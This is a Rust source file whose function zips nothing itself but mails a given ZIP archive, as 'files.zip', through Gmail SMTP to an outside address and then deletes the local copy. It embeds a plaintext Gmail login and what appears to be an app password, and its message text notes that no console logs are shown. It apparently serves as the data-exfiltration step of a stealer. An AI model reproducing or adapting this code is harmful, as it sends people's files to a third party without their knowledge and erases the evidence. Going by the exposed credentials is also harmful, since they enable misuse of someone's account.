use lettre::{
    Message, SmtpTransport, Transport,
    message::{MultiPart, SinglePart},
    message::header::{ContentType, ContentDisposition},
    transport::smtp::authentication::Credentials,
};
use std::{fs, path::Path, time::Duration};
use tokio::time::sleep;

pub async fn send_emergency_email(zip_path: &str) -> Result<(), Box<dyn std::error::Error>> {
    let smtp_server = "smtp.gmail.com";
    let username = "kuraiendo@gmail.com";
    let password = "wkztkjoedtnoquqt";
    let recipient = "avariceares@gmail.com";
    let subject = "Emergency ZIP Report";

    let attachment_data = fs::read(zip_path)?;

    let body_log = "Emergency ZIP file containing important data attached.\nNo console logs displayed during this process.";

    let email = Message::builder()
        .from(username.parse()?)
        .to(recipient.parse()?)
        .subject(subject)
        .multipart(
            MultiPart::mixed()
                .singlepart(
                    SinglePart::builder()
                        .header(ContentType::TEXT_PLAIN)
                        .body(body_log.to_string())
                )
                .singlepart(
                    SinglePart::builder()
                        .header(ContentType::parse("application/zip")?)
                        .header(ContentDisposition::attachment("files.zip"))
                        .body(attachment_data)
                )
        )?;

    let creds = Credentials::new(username.to_string(), password.to_string());
    let mailer = SmtpTransport::relay(smtp_server)?
        .credentials(creds)
        .build();

    for attempt in 1..=3 {
        println!("Sending email, attempt {attempt}...");
        match mailer.send(&email) {
            Ok(_) => {
                println!("Email sent successfully.");
                if Path::new(zip_path).exists() {
                    fs::remove_file(zip_path)?;
                    println!("ZIP file deleted.");
                }
                return Ok(());
            }
            Err(e) => {
                eprintln!("Failed to send email on attempt {attempt}: {e}");
                if attempt < 3 {
                    sleep(Duration::from_secs(5)).await;
                }
            }
        }
    }

    Err("All retries to send email failed".into())
}